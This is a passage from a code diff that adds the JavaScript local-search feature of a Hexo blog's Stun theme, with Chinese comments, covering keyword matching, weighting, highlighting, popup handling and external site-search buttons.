+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
